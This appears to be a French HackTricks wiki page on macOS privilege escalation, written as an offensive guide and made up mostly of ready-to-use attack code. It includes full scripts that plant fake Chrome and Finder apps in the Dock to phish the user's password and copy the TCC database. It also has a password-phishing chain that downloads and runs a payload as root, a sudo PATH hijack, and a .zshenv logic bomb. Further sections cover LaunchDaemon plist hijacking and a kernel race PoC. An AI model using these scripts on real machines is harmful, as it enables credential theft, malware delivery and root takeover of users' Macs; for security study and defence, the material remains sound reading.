# Escalade de privilèges macOS

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Si vous êtes arrivé ici en recherchant une TCC privilege escalation, allez à :


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Veuillez noter que **la plupart des techniques d'escalade de privilèges affectant Linux/Unix affecteront également les machines MacOS**. Consultez donc :


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interaction utilisateur

### Sudo Hijacking

Vous trouverez la technique originale [Sudo Hijacking dans l'article Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Cependant, macOS **conserve** le **`PATH`** de l'utilisateur lorsqu'il exécute **`sudo`**. Cela signifie qu'une autre manière de réaliser cette attaque serait de **détourner d'autres binaires** que la victime exécutera lors de l'**exécution de sudo** :
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Notez qu’un utilisateur qui utilise le terminal aura très probablement **Homebrew installé**. Il est donc possible de détourner des binaires dans **`/opt/homebrew/bin`**.

### Dock Impersonation

Grâce à la **social engineering**, vous pourriez **impersonate, par exemple, Google Chrome** dans le Dock et exécuter votre propre script :

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Quelques suggestions :

- Vérifiez dans le Dock s’il y a Chrome et, le cas échéant, **supprimez** cette entrée, puis **ajoutez** la fausse **entrée Chrome à la même position** dans le tableau du Dock.

<details>
<summary>Script d’impersonation de Chrome dans le Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Quelques suggestions :

- Vous ne pouvez **pas supprimer Finder du Dock**, donc si vous allez l'ajouter au Dock, vous pouvez placer le faux Finder juste à côté du vrai. Pour cela, vous devez **ajouter l'entrée du faux Finder au début du tableau du Dock**.
- Une autre option consiste à ne pas le placer dans le Dock et à simplement l'ouvrir ; « Finder demande à contrôler Finder » n'est pas si étrange.
- Une autre option pour **escalate vers root sans demander** le mot de passe avec une horrible boîte de dialogue consiste à faire réellement demander le mot de passe à Finder pour effectuer une action privilégiée :
- Demander à Finder de copier dans **`/etc/pam.d`** un nouveau fichier **`sudo`** (l'invite demandant le mot de passe indiquera que « Finder veut copier sudo »).
- Demander à Finder de copier un nouvel **Authorization Plugin** (vous pouvez contrôler le nom du fichier afin que l'invite demandant le mot de passe indique que « Finder veut copier Finder.bundle »).

<details>
<summary>Script d'usurpation de Finder dans le Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing par invite de mot de passe + réutilisation de sudo

Les malwares abusent fréquemment de l’interaction avec l’utilisateur pour **capturer un mot de passe permettant d’utiliser sudo** et le réutiliser par programmation. Flux courant :

1. Identifier l’utilisateur connecté avec `whoami`.
2. **Répéter les invites de mot de passe** jusqu’à ce que `dscl . -authonly "$user" "$pw"` renvoie un succès.
3. Mettre en cache l’identifiant (par ex. `/tmp/.pass`) et exécuter des actions privilégiées avec `sudo -S` (mot de passe via stdin).

Exemple de chaîne minimale :
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Le mot de passe volé peut ensuite être réutilisé pour **clear la quarantaine de Gatekeeper avec `xattr -c`**, copier des LaunchDaemons ou d'autres fichiers privilégiés, et exécuter des étapes supplémentaires de manière non interactive.

## Vecteurs spécifiques aux versions récentes de macOS (2023–2025)

### `AuthorizationExecuteWithPrivileges` reste utilisable

`AuthorizationExecuteWithPrivileges` a été déprécié dans la version 10.7, mais **fonctionne toujours sur Sonoma/Sequoia**. De nombreux updaters commerciaux invoquent `/usr/libexec/security_authtrampoline` avec un chemin non fiable. Si le binaire cible est accessible en écriture pour l'utilisateur, vous pouvez y placer un trojan et profiter du prompt légitime :
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combinez avec les **masquerading tricks ci-dessus** pour présenter une boîte de dialogue de mot de passe crédible.


### Triage des helpers privilégiés / XPC

De nombreux privescs macOS tiers modernes suivent le même schéma : un **LaunchDaemon root** expose un **service Mach/XPC** depuis **`/Library/PrivilegedHelperTools`**, puis le helper soit **ne valide pas le client**, le valide **trop tard** (race PID), soit expose une **méthode root** qui utilise un **chemin/script contrôlé par l’utilisateur**. C’est la classe de bugs à l’origine de nombreuses vulnérabilités récentes dans les helpers de clients VPN, de game launchers et d’updaters.<sup>[4]</sup>

Liste de vérification rapide pour le triage :
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Portez une attention particulière aux helpers qui :

- continuent d'accepter des requêtes **après la désinstallation** parce que le job est resté chargé dans `launchd`
- exécutent des scripts ou lisent une configuration depuis **`/Applications/...`** ou d'autres chemins accessibles en écriture par des utilisateurs non-root
- s'appuient sur une validation des pairs **basée sur le PID** ou **uniquement sur le bundle-id**, qui peut être exploitable par une race condition

Pour plus de détails sur les bugs d'autorisation des helpers, consultez [cette page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Héritage de l'environnement des scripts PackageKit (CVE-2024-27822)

Jusqu'à ce qu'Apple corrige le problème dans **Sonoma 14.5**, **Ventura 13.6.7** et **Monterey 12.7.5**, les installations initiées par l'utilisateur via **`Installer.app`** / **`PackageKit.framework`** pouvaient exécuter les **scripts PKG en tant que root dans l'environnement de l'utilisateur actuel**. Cela signifie qu'un package utilisant **`#!/bin/zsh`** chargeait le **`~/.zshenv`** de l'attaquant et l'exécutait en tant que **root** lorsque la victime installait le package.<sup>[3]</sup>

C'est particulièrement intéressant comme **logic bomb** : il suffit d'avoir un foothold dans le compte de l'utilisateur et un fichier de démarrage du shell accessible en écriture, puis d'attendre qu'un installateur vulnérable **basé sur zsh** soit exécuté par l'utilisateur. Cela ne s'applique généralement pas aux déploiements **MDM/Munki**, car ceux-ci s'exécutent dans l'environnement de l'utilisateur root.<sup>[3]</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Si vous souhaitez approfondir les abus spécifiques aux installers, consultez également [cette page](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Détournement d’un plist de LaunchDaemon (pattern CVE-2025-24085)

Si un plist de LaunchDaemon ou sa cible `ProgramArguments` est **modifiable par l’utilisateur**, vous pouvez effectuer une privilege escalation en le remplaçant, puis en forçant launchd à le recharger :
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
This mirrors the exploit pattern published for **CVE-2025-24085**, where a writable plist was abused to execute attacker code as root.

### XNU SMR credential race (CVE-2025-24118)

A **race in `kauth_cred_proc_update`** lets a local attacker corrupt the read-only credential pointer (`proc_ro.p_ucred`) by racing `setgid()`/`getgid()` loops across threads until a torn `memcpy` occurs. Successful corruption yields **uid 0** and kernel memory access. Minimal PoC structure:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Couplez cela à un **heap grooming** pour placer des données contrôlées à l’endroit où le pointeur est relu. Sur les builds vulnérables, cela permet une **local kernel privesc** fiable, sans nécessiter de SIP bypass.<sup>[2]</sup>

### SIP bypass via Migration Assistant ("Migraine", CVE-2023-32369)

Si vous avez déjà les privilèges root, SIP bloque toujours les écritures dans les emplacements système. Le bug **Migraine** abuse de l’entitlement de Migration Assistant `com.apple.rootless.install.heritable` pour lancer un processus enfant qui hérite du SIP bypass et écrase des chemins protégés (par exemple, `/System/Library/LaunchDaemons`).<sup>[1]</sup> La chaîne :

1. Obtenir les privilèges root sur un système en fonctionnement.
2. Déclencher `systemmigrationd` avec un état spécialement conçu pour exécuter un binaire contrôlé par l’attaquant.
3. Utiliser l’entitlement hérité pour modifier des fichiers protégés par SIP, en conservant la persistance même après un redémarrage.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Plusieurs daemons Apple acceptent des objets **NSPredicate** via XPC et valident uniquement le champ `expressionType`, qui est contrôlé par l’attaquant. En créant un predicate qui évalue des selectors arbitraires, il est possible d’obtenir une **code execution dans des services XPC root/system** (par exemple, `coreduetd`, `contextstored`). Combiné à un premier sandbox escape d’application, cela permet une **privilege escalation sans invites utilisateur**. Recherchez les endpoints XPC qui désérialisent des predicates et ne disposent pas d’un visitor robuste.

## TCC - Élévation de privilèges root

### CVE-2020-9771 - mount_apfs TCC bypass et élévation de privilèges

**Tout utilisateur** (même sans privilèges) peut créer et monter un snapshot Time Machine avec `-o noowners` et **accéder à TOUS les fichiers** de ce snapshot, en contournant les vérifications de propriété sur le volume actif. Le seul privilège nécessaire est que l’application utilisée (comme `Terminal`) dispose de **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Les commandes et l’explication complète se trouvent sur la page TCC bypasses :

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informations sensibles

Cela peut être utile pour élever les privilèges :


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Références

- [1] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
